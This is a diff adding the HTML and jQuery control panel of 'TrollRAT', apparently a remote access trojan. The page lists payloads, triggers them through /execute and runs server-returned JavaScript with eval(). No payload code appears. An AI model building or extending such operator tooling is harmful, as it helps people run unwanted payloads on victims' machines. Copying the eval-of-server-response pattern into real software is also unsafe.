@@ -1,0 +1,146 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!-- Latest compiled and minified CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
+
+    <!-- jQuery -->
+    <script src="https://code.jquery.com/jquery-2.2.4.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+    <!-- Latest compiled and minified JavaScript -->
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
+
+    <style type="text/css">
+        body {
+            padding-top: 70px;
+        }
+    </style>
+
+    <title>TrollRAT</title>
+</head>
+<body>
+    <nav class="navbar navbar-default navbar-fixed-top">
+        <div class="container">
+            <div class="navbar-header">
+                <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="#">TrollRAT</a>
+            </div>
+
+            <div class="collapse navbar-collapse" id="navbar">
+                <button type="button" class="btn btn-default navbar-btn">Toggle all payloads</button>
+                <ul class="nav navbar-nav"></ul>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="row">
+            <div class="col-md-4">
+                <h3>Payloads</h3>
+                <div class="list-group" id="payloads">
+
+                </div>
+            </div>
+
+            <div class="col-md-8">
+                <h3>Settings</h3>
+                <div id="settings"></div>
+
+                <h3>Actions</h3>
+                <div id="actions"></div>
+            </div>
+        </div>
+    </div>
+
+    <script type="text/javascript">
+        block = false;
+
+        function update() {
+            var active = $("#payloads").children().index($("#payloads .active"));
+            $("#actions").html("<p>Loading actions...</p>");
+
+            $.ajax({
+                method: "GET",
+                url: "/actions",
+                data: {"payload": active}
+            }).done(function (actions) {
+                $("#actions").html(actions);
+            }).error(function () {
+                $("#actions").html("<p>Something went wrong :(</p>");
+            });;
+
+            $.ajax({
+                method: "GET",
+                url: "/payloads",
+            }).done(function (payloads) {
+                $("#payloads").html(payloads);
+
+                if (active != -1)
+                    $("#payloads").children().eq(active).addClass("active");
+            });
+        }
+
+        function execute(id, payload) {
+            block = true;
+            window.setTimeout(function () { block = false }, 100);
+
+            $.ajax({
+                method: "GET",
+                url: "/execute",
+                data: {"id": id, "payload": payload}
+            }).done(function (js) {
+                eval(js);
+            }).error(function () {
+                alert("Server communication failed :(");
+            });
+        }
+
+        function setSetting(id, value) {
+            $.ajax({
+                method: "GET",
+                url: "/set",
+                data: { "id": id, "value": value }
+            }).error(function () {
+                alert("Server communication failed :(");
+            });
+        }
+
+        function getSettings(obj) {
+            if (block)
+                return;
+
+            var i = $("#payloads").children().index($(obj));
+
+            $("#payloads > .list-group-item").each(function() {
+                $(this).removeClass("active");
+            })
+
+            $("#settings").html("<p>Loading settings...</p>");
+
+            $.ajax({
+                method: "GET",
+                url: "/settings",
+                data: {index: i}
+            }).done(function (settings) {
+                $(obj).addClass("active");
+                $("#settings").html(settings);
+                update();
+            }).error(function() {
+                $("#settings").html("<p>Something went wrong :(</p>");
+            });
+        }
+
+        update();
+    </script>
+</body>
+</html>
